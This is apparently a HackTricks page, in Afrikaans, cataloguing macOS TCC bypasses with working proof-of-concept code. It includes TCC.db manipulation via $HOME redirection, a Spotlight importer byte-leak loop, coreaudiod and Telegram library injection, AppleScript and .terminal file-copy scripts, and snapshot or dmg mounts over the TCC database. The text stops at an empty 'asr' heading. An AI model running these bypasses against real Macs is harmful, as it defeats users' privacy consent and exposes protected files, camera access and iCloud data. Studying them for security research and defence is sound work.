# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

Vir TCC-toestemmingberging en die toeskrywing van Automation-sender/teiken, sien die [macOS TCC-oorsig](../index.html#identify-apple-events-sender-and-target-grants).

## Volgens funksionaliteit

### Write Bypass

Dit is nie ’n bypass nie, dis net hoe TCC werk: **Dit beskerm nie teen skryf nie**. As Terminal **nie toegang het om die Desktop van ’n gebruiker te lees nie, kan dit steeds daarin skryf**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Die **uitgebreide attribuut `com.apple.macl`** word by die nuwe **lêer** gevoeg om die **skeppersprogram** toegang te gee om dit te lees.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Dit is moontlik om **’n venster oor die TCC-aanporboodskap te plaas** sodat die gebruiker dit **aanvaar** sonder om dit agter te kom. Jy kan ’n PoC vind by [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC-versoek onder ’n arbitrêre naam

’n Aanvaller kan **programme met enige naam skep** (bv. Finder, Google Chrome...) in die **`Info.plist`** en dit toegang laat versoek tot ’n TCC-beskermde ligging. Die gebruiker sal dink dat die wettige toepassing hierdie toegang versoek.\
Boonop is dit moontlik om **die wettige program uit die Dock te verwyder en die vals een daarop te plaas**, sodat wanneer die gebruiker op die vals een klik (wat dieselfde ikoon kan gebruik), dit die wettige een kan oproep, TCC-toestemmings kan versoek en malware kan uitvoer. Die gebruiker sal dan glo dat die wettige toepassing toegang versoek het.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Meer inligting en ’n PoC by:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

By verstek het toegang via **SSH vroeër "Full Disk Access" gehad**. Om dit te deaktiveer, moet dit gelys wees, maar gedeaktiveer (as jy dit van die lys verwyder, word daardie voorregte nie verwyder nie):<sup>[[2]](#references)</sup>

![TCC-versoek onder ’n arbitrêre naam - SSH Bypass: By verstek het toegang via SSH vroeër "Full Disk Access" gehad. Om dit te deaktiveer, moet dit gelys wees, maar gedeaktiveer (as jy dit...](<../../../../../images/image (1077).png>)

Hier kan jy voorbeelde vind van hoe sommige **malware hierdie beskerming kon omseil**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Let daarop dat jy nou **Full Disk Access** nodig het om SSH te kan aktiveer.

### Hanteer uitbreidings - CVE-2022-26767

Die attribuut **`com.apple.macl`** word aan lêers toegeken om **’n sekere toepassing toestemming te gee om dit te lees.** Hierdie attribuut word gestel wanneer ’n lêer **gesleep en neergesit** word op ’n toepassing, of wanneer ’n gebruiker ’n lêer **dubbelklik** om dit met die **verstektoepassing** oop te maak.

’n Gebruiker kan dus **’n kwaadwillige toepassing registreer** om alle uitbreidings te hanteer en Launch Services oproep om enige lêer **oop te maak** (sodat die kwaadwillige lêer toestemming kry om dit te lees).<sup>[[23]](#references)</sup>

### iCloud

Met die entitlement **`com.apple.private.icloud-account-access`** is dit moontlik om met die **`com.apple.iCloudHelper`** XPC-diens te kommunikeer, wat **iCloud-tokens sal verskaf**.

**iMovie** en **Garageband** het hierdie entitlement en ander gehad wat dit toegelaat het.

Vir meer **inligting** oor die exploit om **iCloud-tokens** met daardie entitlement te bekom, kyk na die praatjie: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Spotlight importer leakage via Darwin-notifikasiename

’n Spotlight importer kan die lêer lees wat Spotlight aan sy `GetMetadataForFile`-terugroepfunksie deurgee, selfs wanneer ’n gewone proses sonder Full Disk Access dit nie kan lees nie. Anders as [kode-inspuiting in ’n TCC-gemagtigde proses](../macos-tcc-credential-and-data-theft.md), vereis dit ’n plaaslike vastrapplek wat ’n importer kan installeer, asook ’n ooreenstemmende Spotlight-indekseringsgebeurtenis. Die importer is in ’n sandbox, maar Darwin-notifikasies wat net ’n naam bevat, kan grepe na ’n luisteraar buite daardie sandbox stuur. Dit is ’n data-leak-kanaal, nie ’n roete na root of arbitrêre lêertoegang vanuit die importer nie.<sup>[[24]](#references)</sup>

Verklaar die teikenlêertipe onder `CFBundleDocumentTypes` → `LSItemContentTypes` in die importer se `Info.plist`, en installeer dan die bundle in `~/Library/Spotlight/` of ’n toepassing se `Contents/Library/Spotlight/`. Kontroleer die registrasie met `mdimport -L`. Die [Spotlight importer-afdeling](../../../../macos-auto-start-locations.md#spotlight-plugins) bespreek waar bundles geplaas word en hoe lêertipes ooreenstem. Die importer ontvang slegs lêers waarvoor Spotlight dit kies; ’n bestaande importer geniet oor die algemeen voorrang. Op macOS 26 Tahoe het `mdimport -i` volgens die gerapporteerde toetse nie betroubaar onmiddellike rekursiewe indeksering afgedwing nie, terwyl `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` ’n versoek gerig het om UTIs wat deur daardie importer opgeëis word, weer in te voer.<sup>[[24]](#references)</sup>

Vir ’n kanaaltoets, begin ’n luisteraar buite die sandbox met `notifyutil -w TEST_TEST_TEST`, en plaas dan ’n notifikasie met `CFNotificationCenterGetDarwinNotifyCenter()` en `NULL` as objek en `userInfo`. Anders as ’n verspreide notifikasie met ’n `userInfo`-lading, het die Darwin-notifikasie net sy naam. Vir binêre data, registreer die eksterne luisteraar vir desimale name `0` tot `255` met `notify_register_dispatch`; koppel elke terugroepfunksie se registrasie aan sy greepwaarde. Lees binne `GetMetadataForFile` slegs die Spotlight-verskafde `pathToFile` en stuur elke greep as ’n desimale notifikasienaam:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Die listener rekonstrueer die byte-volgorde eerder as om die TCC-beskermde lêer self te lees. Die gepubliseerde PoC het die eerste 64 bytes van `knowledgeC.db` vanaf ’n terminal sonder FDA herstel, met SIP geaktiveer op macOS 26. Dit is lae-bandwydte en nie ’n betroubare metode vir grootmaatkopiëring nie: Spotlight indekseer of herindekseer moontlik nie ’n teikenlêer nie, en gelyktydige importer-instansies kan kennisgewingstrome deurmekaar vleg. Sien [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) vir ander sandbox-grensmeganismes.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

’n App met die **`kTCCServiceAppleEvents`**-toestemming sal **ander Apps kan beheer**. Dit beteken dat dit moontlik **die toestemmings wat aan die ander Apps toegeken is, kan misbruik**.<sup>[[2]](#references)</sup>

Vir meer inligting oor Apple Scripts, kyk na:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Byvoorbeeld, as ’n App **Automation-toestemming oor `iTerm`** het, soos in hierdie voorbeeld waar **`Terminal`** toegang tot iTerm het:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Oor iTerm

Terminal, wat nie FDA het nie, kan iTerm, wat wel FDA het, oproep en dit gebruik om aksies uit te voer:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Via Finder

Of as ’n App toegang via Finder het, kan dit ’n script soos hierdie een uitvoer:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Volgens app se gedrag

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Die userland **tccd daemon** het die **`HOME`**-**env**-veranderlike gebruik om toegang tot die TCC-gebruikersdatabasis te kry by: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Volgens [hierdie Stack Exchange-plasing](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), en omdat die TCC-daemon via `launchd` binne die huidige gebruiker se domein loop, is dit moontlik om **alle omgewingsveranderlikes** wat daaraan oorgedra word, te **beheer**.<sup>[[19]](#references)</sup>\
’n **Aanvaller kan dus die `$HOME`-omgewingsveranderlike** in **`launchctl`** stel sodat dit na ’n **beheerde** **gids** wys, die **TCC**-daemon **herbegin** en dan die **TCC-databasis direk wysig** om aan homself **elke beskikbare TCC-regte** toe te ken sonder om ooit die eindgebruiker te vra.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes het toegang gehad tot TCC-beskermde liggings, maar ’n nuutgeskepte nota is **in ’n nie-beskermde ligging gestoor**. ’n Aanvaller kon Notes dus vra om ’n beskermde lêer na ’n nota te kopieer en daarna toegang tot die resulterende data vanaf die nie-beskermde ligging kry:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die binary `/usr/libexec/lsd` met die library `libsecurity_translocate` het die entitlement `com.apple.private.nullfs_allow` gehad, wat dit toegelaat het om **nullfs**-mounts te skep, en die entitlement `com.apple.private.tcc.allow` met **`kTCCServiceSystemPolicyAllFiles`** om toegang tot elke lêer te kry.

Dit was moontlik om die quarantine-attribuut by "Library" te voeg, die **`com.apple.security.translocation`** XPC-diens aan te roep, en dan sou dit Library karteer na **`$TMPDIR/AppTranslocation/d/d/Library`**, waar al die dokumente binne Library **toeganklik** sou wees.

### CVE-2024-44131 - FileProvider symlink race

Programme wat lêerbewerkings aan ’n **bevoorregte helper** oorlaat (hier **`fileproviderd`** / `Files.app`), kopieer of skuif items **namens die gebruiker**, dus word die kopie met die helper se voorregte uitgevoer eerder as dié van die oproeper.

Jamf Threat Labs het gewys dat die symlink-validasie wat voor die bewerking uitgevoer word, **uitgerace** kan word: in plaas daarvan om die symlink op die **laaste** padkomponent (wat nagegaan word) te plaas, vervang die aanvaller ’n **tussengids** in die pad **nadat die kopie reeds begin het**. Die bevoorregte helper volg dan die aanvaller-beheerde skakel en lees/skryf na TCC-beskermde liggings **sonder om ooit ’n prompt te wys**.<sup>[[5]](#references)</sup>

Gidse wat **nie** deur ’n ewekansige UUID in hul pad beskerm word nie (byvoorbeeld `~/Library/Mobile Documents/com~apple~CloudDocs`), is die maklikste teikens, omdat die aanvaller die volledige pad om die race uit te voer kan voorspel.

> [!TIP]
> Dit is die algemene patroon waarna jy moet soek: **enige bevoorregte proses wat ’n pad meer as een keer oplos** (check-then-use, of `rename()`/`copyfile()` wat die bron en bestemming afsonderlik oplos) kan uitgerace word deur ’n gids in die middel van die pad te vervang. Slegs `O_NOFOLLOW_ANY`, `openat()` op ’n reeds oopgemaakte gids-FD, of `realpath()` + her-validering sluit die tydvenster werklik.

Meer inligting in [**die Jamf Threat Labs-skrywe**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` kan met `SQLITE_ENABLE_SQLLOG` gebou word, wat ’n logging-hook byvoeg wat deur omgewingsveranderlikes beheer word ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – vir **elke databasis wat oopgemaak word**, word ’n **kopie van die databasislêer** en ’n log van die SQL-stellings na `path` geskryf (die gids moet reeds bestaan).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – maak **elke keer ’n nuwe kopie** wanneer ’n DB oopgemaak/aangeheg word, eerder as om een te hergebruik.
- **`SQLITE_SQLLOG_CONDITIONAL`** – log slegs ’n verbinding as ’n `<database>-sqllog`-lêer langs die hoof-DB bestaan.

As jy hierdie veranderlike in ’n proses kan inspuit wat **FDA** het en SQLite-databasisse oopmaak, sal dit daardie beskermde databasisse graag **na ’n gids onder jou beheer kopieer**. Omdat die bestemmingslêernaam van aanvaller-beheerde data afgelei word, verander ’n **symlink wat by die bestemming geplaas is** dieselfde primitive in ’n **arbitrêre lêerskryf** met die teikenproses se voorregte.

### **SQLITE_AUTO_TRACE**

As die omgewingsveranderlike **`SQLITE_AUTO_TRACE`** gestel is, sal die library **`libsqlite3.dylib`** al die SQL-navrae begin **log**. Baie toepassings het hierdie library gebruik, dus was dit moontlik om al hul SQLite-navrae te log.<sup>[[22]](#references)</sup>

Verskeie Apple-toepassings het hierdie library gebruik om toegang tot TCC-beskermde inligting te kry.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Soek na lêerskryftake wat deur omgewingsveranderlikes beheer word

Die twee vorige voorbeelde is gevalle van dieselfde generiese tegniek, en dit is die moeite werd om na meer te soek: **frameworks wat in TCC-bevoorregte apps gelaai word, stel dikwels debug-/logging-omgewingsveranderlikes beskikbaar wat veroorsaak dat die proses ’n lêer skep by ’n pad wat deur die oproeper beheer word**.

Werkvloei om hulle te vind:

1. Kies ’n teiken met FDA of ’n ander waardevolle TCC-permissie (`Music`, `TV`, `Terminal`, MDM-agents...) en lys die frameworks waarna dit skakel (`otool -L`, `vmmap`).
2. Soek deur daardie frameworks vir `getenv`-stringe: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Stel kandidaat-veranderlikes met `launchctl setenv NAME /path/you/control`, begin die app en hou dop wat dit op die lêerstelsel doen met `fs_usage -w -f filesys <pid>` of `sudo fs_usage | grep <path>`.
4. As die proses ’n lêer in jou gids **skep of hernoem**, het jy ’n write primitive: wys die bestemming na ’n symlink (of jaag ’n tussengids, soos in CVE-2024-44131 hierbo) om dit na `~/Library/Application Support/com.apple.TCC/TCC.db` te herlei.

> [!TIP]
> Twee dinge beperk dit. Eerstens word **`DYLD_*`-veranderlikes geïgnoreer vir hardened-runtime-binaries**, tensy die app die [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)-entitlement insluit ("’n Booleaanse waarde wat aandui of die app deur dynamic linker-omgewingsveranderlikes beïnvloed mag word, wat jy kan gebruik om code in jou app se proses in te spuit") — sien ook [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Tweedens verwyder Apple individuele framework-debug-veranderlikes namate dit aangemeld word, dus is ’n veranderlike wat op een macOS-vrystelling gewerk het dikwels teen die volgende een weg. As ’n app stilweg weier om te begin nadat jy een gestel het, aanvaar dat daardie veranderlike reeds gefiltreer word.<sup>[[7]](#references)[[8]](#references)</sup>

Kyk na [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) vir die ekwivalente truuk met linker-veranderlikes.

### Apple Remote Desktop

As root kon jy hierdie diens aktiveer, waarna die **ARD-agent volle skyftoegang sal hê**. ’n Gebruiker kan dit dan misbruik om die agent ’n nuwe **TCC-gebruikersdatabasis** te laat kopieer.

## Via **NFSHomeDirectory**

TCC gebruik ’n databasis in die gebruiker se HOME-gids om toegang tot hulpbronne wat spesifiek vir die gebruiker is, te beheer by **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
As die gebruiker dus daarin slaag om TCC te herbegin met ’n $HOME-omgewingsveranderlike wat na ’n **ander gids** wys, kan die gebruiker ’n nuwe TCC-databasis in **/Library/Application Support/com.apple.TCC/TCC.db** skep en TCC flous om enige TCC-permissie aan enige app toe te ken.

> [!TIP]
> Let daarop dat Apple die instelling wat in die gebruiker se profiel gestoor is, in die **`NFSHomeDirectory`**-kenmerk gebruik as die **waarde van `$HOME`**. As jy dus ’n app kompromitteer wat toestemming het om hierdie waarde te wysig (**`kTCCServiceSystemPolicySysAdminFiles`**), kan jy hierdie opsie **weaponize** met ’n TCC-bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Die **eerste POC** gebruik [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) en [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) om die gebruiker se **HOME**-gids te wysig.

1. Kry ’n _csreq_-blob vir die teiken-app.
2. Plaas ’n vals _TCC.db_-lêer met die vereiste toegang en die _csreq_-blob.
3. Voer die gebruiker se Directory Services-inskrywing uit met [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Wysig die Directory Services-inskrywing om die gebruiker se tuisgids te verander.
5. Voer die gewysigde Directory Services-inskrywing in met [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop die gebruiker se _tccd_ en herlaai die proses.

Die tweede POC het **`/usr/libexec/configd`** gebruik, wat `com.apple.private.tcc.allow` met die waarde `kTCCServiceSystemPolicySysAdminFiles` gehad het.\
Dit was moontlik om **`configd`** met die **`-t`**-opsie te laat loop, waarmee ’n aanvaller ’n **pasgemaakte Bundle om te laai** kon spesifiseer. Die exploit **vervang** dus die **`dsexport`**- en **`dsimport`**-metode om die gebruiker se tuisgids te verander met **code injection in `configd`**.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Via process injection

Daar is verskillende tegnieke om code in ’n proses in te spuit en die TCC-regte daarvan te misbruik:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Verder is die mees algemene process injection-tegniek wat gevind is om TCC te omseil, via **plugins (load library)**.\
Plugins is ekstra code, gewoonlik in die vorm van libraries of plist-lêers, wat deur die **hoofapp gelaai word** en binne die konteks daarvan uitgevoer word. As die hoofapp dus toegang tot TCC-beperkte lêers gehad het (via toegeken toestemmings of entitlements), sal die **pasgemaakte code dit ook hê**.

### CVE-2020-27937 - Directory Utility

Die toepassing `/System/Library/CoreServices/Applications/Directory Utility.app` het die entitlement **`kTCCServiceSystemPolicySysAdminFiles`** gehad, plugins met die **`.daplug`**-uitbreiding gelaai en **nie die hardened runtime gehad nie**.

Om hierdie CVE te weaponize, word **`NFSHomeDirectory`** **verander** (deur die vorige entitlement te misbruik) om **beheer oor die gebruiker se TCC-databasis oor te neem** en TCC te omseil.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Die binary **`/usr/sbin/coreaudiod`** het die entitlements `com.apple.security.cs.disable-library-validation` en `com.apple.private.tcc.manager` gehad. Die eerste **laat code injection toe**, en die tweede gee dit toegang om **TCC te bestuur**.

Hierdie binary kon **third-party plug-ins** vanaf die gids `/Library/Audio/Plug-Ins/HAL` laai. Dit was dus moontlik om ’n plugin te **laai en die TCC-permissies te misbruik** met hierdie PoC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Stelseltoepassings wat kamerastrome via Core Media I/O oopmaak (toepassings met **`kTCCServiceCamera`**), laai hierdie inproppe in die proses. Hulle is in `/Library/CoreMediaIO/Plug-Ins/DAL` geleë (nie deur SIP beperk nie).

Dit is genoeg om ’n biblioteek met die algemene **constructor** daar te stoor om **code** in te spuit.

Verskeie Apple-toepassings was hiervoor kwesbaar.

### Firefox

Die Firefox-toepassing het die `com.apple.security.cs.disable-library-validation`- en `com.apple.security.cs.allow-dyld-environment-variables`-entitlements gehad:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Vir meer inligting oor hoe om dit maklik uit te buit, [**kyk na die oorspronklike verslag**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Die binêre lêer `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` het die entitlements **`com.apple.private.tcc.allow`** en **`com.apple.security.get-task-allow`** gehad, wat toegelaat het dat kode binne die proses ingespuit word en die TCC-voorregte gebruik word.

### CVE-2023-26818 - Telegram

Telegram het die entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** en **`com.apple.security.cs.disable-library-validation`** gehad, dus was dit moontlik om dit te misbruik om **toegang tot sy toestemmings te verkry**, soos om met die kamera op te neem. Jy kan [**die payload in die writeup vind**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Let op hoe ’n **custom plist** geskep is om ’n library in te spuit deur die omgewingsveranderlike te gebruik om die library te laai, en hoe **`launchctl`** gebruik is om dit te begin:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Deur `open`-aanroepe

Dit is moontlik om **`open`** aan te roep selfs wanneer jy in ’n sandbox is.

### Terminal-skripte

Dit is redelik algemeen om Terminal **Full Disk Access (FDA)** te gee, ten minste op rekenaars wat deur tegniese mense gebruik word. Dit is ook moontlik om **`.terminal`**-skripte daarmee uit te voer.

**`.terminal`**-skripte is plist-lêers soos hierdie, met die opdrag wat uitgevoer moet word in die **`CommandString`**-sleutel:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

'n Toepassing kan 'n terminalskrip op 'n plek soos /tmp skryf en dit met 'n opdrag soos die volgende uitvoer:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Deur te monteer

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Enige gebruiker** (selfs gebruikers sonder bevoorregte toegang) kan ’n Time Machine-snapshot skep en monteer, en **toegang tot AL die lêers** in daardie snapshot verkry.\
Die **enigste vereiste voorreg** is dat die gebruikte toepassing (soos `Terminal`) **Full Disk Access** (FDA)-toegang (`kTCCServiceSystemPolicyAllfiles`) het, wat deur ’n admin toegestaan moet word.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

’n Meer gedetailleerde verduideliking kan [**in die oorspronklike verslag gevind word**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount oor TCC-lêer

Selfs al is die TCC DB-lêer beskerm, was dit moontlik om ’n nuwe TCC.db-lêer oor die gids te mount:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Gaan die **volledige exploit** na in die [**oorspronklike skrywe**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Soos in die [oorspronklike skrywe](https://www.kandji.io/blog/macos-audit-story-part2) verduidelik word, het hierdie CVE `diskarbitrationd` misbruik.<sup>[[16]](#references)</sup>

Die funksie `DADiskMountWithArgumentsCommon` van die publieke `DiskArbitration`-raamwerk het die sekuriteitskontroles uitgevoer. Dit was egter moontlik om dit te omseil deur `diskarbitrationd` direk aan te roep en dus `../`-elemente in die pad en simboliese skakels te gebruik.

Dit het ’n aanvaller toegelaat om arbitrêre mounts op enige plek uit te voer, insluitend oor die TCC-databasis, weens die `com.apple.private.security.storage-exempt.heritable`-entitlement van `diskarbitrationd`.

### asr

